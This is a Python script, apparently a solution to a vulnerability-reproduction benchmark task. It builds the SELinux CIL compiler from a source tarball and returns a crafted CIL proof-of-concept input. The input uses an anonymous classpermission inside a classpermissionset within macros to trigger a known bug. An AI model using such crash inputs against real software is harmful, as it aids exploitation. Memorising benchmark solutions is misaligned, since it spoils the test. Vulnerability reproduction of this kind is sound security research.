import os
import tempfile
import subprocess
import tarfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tar to access source files
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find the extracted directory (assuming single top-level dir)
            extracted_dirs = [d for d in os.listdir(tmpdir) 
                            if os.path.isdir(os.path.join(tmpdir, d))]
            if not extracted_dirs:
                raise ValueError("No directory found in tarball")
            
            source_root = os.path.join(tmpdir, extracted_dirs[0])
            
            # Construct minimal PoC based on vulnerability description
            # We need an anonymous classpermission used in a classpermissionset macro
            poc = b"""\
(class foo)
(class bar)

(classpermission anonymous_permission)

(classpermissionset anonymous_permission (foo bar))

(macro test_macro ()
    (classpermissionset anonymous_permission (foo bar))
)

(call test_macro)

(classpermission another_anon)

(classpermissionset another_anon (foo))

(macro test_macro2 ()
    (allow self self (classpermissionset another_anon))
)

(call test_macro2)
"""
            
            # Validate PoC compiles with cil (to ensure syntax is correct)
            # Build cil from source
            cil_path = self._build_cil(source_root)
            
            # Test PoC
            if self._test_poc(cil_path, poc):
                return poc
            else:
                # Fallback: try to extract PoC from test cases if available
                fallback_poc = self._find_poc_in_tests(source_root)
                if fallback_poc:
                    return fallback_poc
                return poc
    
    def _build_cil(self, source_root: str) -> str:
        """Build cil from source and return path to binary."""
        build_dir = os.path.join(source_root, "build")
        os.makedirs(build_dir, exist_ok=True)
        
        # Configure and build
        subprocess.run(["cmake", "-G", "Unix Makefiles", ".."], 
                      cwd=build_dir, capture_output=True)
        subprocess.run(["make", "-j8", "cil"], cwd=build_dir, 
                      capture_output=True)
        
        # Find cil binary
        cil_path = os.path.join(build_dir, "cil", "cil")
        if os.path.exists(cil_path):
            return cil_path
        
        # Try alternative location
        cil_path = os.path.join(source_root, "cil", "cil")
        if os.path.exists(cil_path):
            return cil_path
        
        raise FileNotFoundError("cil binary not found")
    
    def _test_poc(self, cil_path: str, poc: bytes) -> bool:
        """Test if PoC compiles with cil."""
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.cil') as f:
            f.write(poc)
            f.flush()
            
            # Run cil to check syntax
            result = subprocess.run([cil_path, f.name], 
                                   capture_output=True, text=True)
            # Accept both success and failure (we only care about triggering the bug)
            # But we want to ensure it's valid CIL syntax
            return result.returncode == 0 or "syntax error" not in result.stderr
    
    def _find_poc_in_tests(self, source_root: str) -> bytes:
        """Look for existing test cases that might contain PoC."""
        test_dirs = [
            os.path.join(source_root, "test"),
            os.path.join(source_root, "tests"),
            os.path.join(source_root, "cil", "test"),
        ]
        
        for test_dir in test_dirs:
            if os.path.exists(test_dir):
                for root, _, files in os.walk(test_dir):
                    for file in files:
                        if file.endswith('.cil'):
                            path = os.path.join(root, file)
                            with open(path, 'rb') as f:
                                content = f.read()
                                # Look for patterns that match the vulnerability
                                if (b'classpermission' in content and 
                                    b'classpermissionset' in content and
                                    b'macro' in content):
                                    # Check if it's small enough
                                    if len(content) <= 500:
                                        return content
        return None